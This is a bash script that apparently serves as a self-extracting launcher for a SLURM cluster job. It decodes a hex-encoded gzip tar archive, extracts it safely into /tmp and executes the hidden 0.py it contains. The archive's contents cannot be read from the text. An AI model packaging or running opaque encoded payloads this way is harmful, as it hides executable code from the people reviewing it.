#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed953d6fdb30108633eb57105e2401064d7d501f0e3c76efd0762982e02451361d9b1248ba895bf4bf97948cc045806e495af49e411425de7be41d8f64746f0675f3aa3047c1d8d4b2972dcbb2fcf97dfe5e94457943d8eb4e6be6642c68e7f22d7cfd85fc58d8e141a8c59a2ca061499ae5bc28ab7ab1248b11ce8701ba7bb38394177e4451f2246b1be87391d7499ba55dd5a5292f8b2a654d99a53c49d2826745d15600a5e8a0ceeb32c9599515bc01915eab36672b8c13e559551559edff1c405d392b735e41dbf3be615d9643cb7a516615ab38abdb268382d7252479dfa665d5f499e88aa4e615e75ddb545d25ca64f1f3bd63fb2fc0e8787e751f7faeff24495ed47f9e6758ff6f813c8e83b6c49ccdd25f04cb1d98dd41364b17945e1e44d0ebe14846b0fe23b90cfee8ba81def826728614f4f6dbd7e42ebe6d375e83fafa3651a457219b6e9730a65ab892b7e2c946711cc06c1aae463dec456b57ed703c9e94b4e7d57e7f1627b50de355fb359c4ea6f0cecbd8edf730006384737f99229d8f8a0866f1e93c71ea74279e3ab915c6b9da6c9ccaefc75878173c4abb2397f5d161142a82988021761d907ed04410a9a60e913d518325822a380aea378a35de3a0a07ddee4077f7bb84adc278dd0eca4a7512d736d27807514c9c644869e855a775cf72311dbddc5a8334827c81c3497cd07ad051f85919e8fd24c6930d6327396e5c28c770351bde8ede52284b8f0f9dd4d1dc319b4ffa2496e2491a7b3f3c4cbdd80d7dd4d28a4b702c7509d0d0da696262ce8a4f884fa2cf3195ca4738624b63753439757fa72d70b560ba1f9eb7c211a40afc23d271f0de7b1941100441100441100441100441100441100441100441fe577e01b3ae46a500280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
